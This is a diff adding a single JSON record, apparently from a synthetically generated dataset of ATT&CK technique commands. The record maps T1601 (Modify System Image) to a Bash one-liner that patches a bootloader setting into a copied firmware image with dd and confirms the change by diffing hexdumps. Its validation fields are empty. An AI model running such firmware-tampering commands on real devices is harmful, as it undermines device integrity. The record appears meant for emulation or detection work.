@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "echo -n 'bootdelay=0' | dd of=/var/tmp/modified_system.img bs=1 seek=$((0x4F200)) conv=notrunc && diff -u <(dd if=/bootflash/prod_system.img bs=1 skip=$((0x4F000)) count=$((0x0400)) 2>/dev/null | hexdump -C) <(dd if=/var/tmp/modified_system.img bs=1 skip=$((0x4F000)) count=$((0x0400)) 2>/dev/null | hexdump -C)",
+  "explanation": "Patches bytes in a suspected bootloader environment region inside the system image and diffs hexdumps of the region to confirm the alteration.",
+  "rationale_steps": [
+    "Write new bytes at a targeted offset within the firmware image using dd (root-only).",
+    "Extract and hexdump the relevant region from both images.",
+    "Use diff to validate low-level modification within the system image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-ab67c808",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
